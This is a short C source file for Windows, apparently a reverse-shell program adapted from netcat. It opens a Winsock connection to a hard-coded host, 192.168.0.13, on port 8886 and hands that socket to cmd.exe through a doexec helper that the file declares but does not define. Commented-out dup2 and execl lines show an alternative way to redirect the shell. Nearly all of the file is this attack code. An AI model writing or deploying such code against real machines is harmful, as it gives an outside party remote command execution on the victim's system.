
#include <Winsock2.h>
#include <sys/types.h>
//#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>


char * pr00gie = "c:\\windows\\system32\\cmd.exe";	
BOOL doexec(SOCKET  ClientSocket);

/* holler :
   fake varargs -- need to do this way because we wind up calling through
   more levels of indirection than vanilla varargs can handle, and not all
   machines have vfprintf/vsyslog/whatever!  6 params oughta be enough. */
void holler (str, p1, p2, p3, p4, p5, p6)
  char * str;
  char * p1, * p2, * p3, * p4, * p5, * p6;
{
  
	printf("%s\n", str);
  
} /* holler */


int main()
{
 
    int resultfd;//, sockfd;
    SOCKET sockfd;
    int port = 8886;
    struct sockaddr_in my_addr;
    char buffer[1024];
    
    
    WSABUF CallerData;
    WSABUF CalleeData;

 
 	WORD wVersionRequested; 
	WSADATA wsaData; 
	int err; 
	wVersionRequested = MAKEWORD(1, 1); 
 
	err = WSAStartup(wVersionRequested, &wsaData); 
 
	if (err != 0) 
    /* Tell the user that we couldn't find a useable */ 
    /* winsock.dll.     */ 
    	return; 
    // syscall 102
    // int socketcall(int call, unsigned long *args);
 
    // sycall socketcall (sys_socket 1)
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
    // syscall socketcall (sys_setsockopt 14)
        int one = 1;
    //#setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
 
    // set struct values
    my_addr.sin_family = AF_INET; // 2
    my_addr.sin_port = htons(port); // port number
    my_addr.sin_addr.s_addr = inet_addr("192.168.0.13"); // 0 fill with the local IP
 
    memset(my_addr.sin_zero, '\0', sizeof(my_addr.sin_zero));
    //connect(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr), &CallerData, &CalleeData, NULL, NULL);
    connect(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
    //recv(sockfd, buffer, 1024, 0);
    // syscall 63
    doexec(sockfd);
    send(sockfd, "Connect.", 9, 0);
    
	/*
    dup2(sockfd, 2);
    dup2(sockfd, 1);
    dup2(sockfd, 0);
 	send(sockfd, "Conneee.", 9, 0);
 	//printf("hhh");
    // syscall 11
    //execl("c:\\windows\\system32\\cmd.exe", "c:\\windows\\system32\\cmd.exe", NULL);
    //execlp("cmd.exe", "cmd.exe", NULL);
	*/
 	send(sockfd, "Endnect.", 9, 0);
    return 0;
}
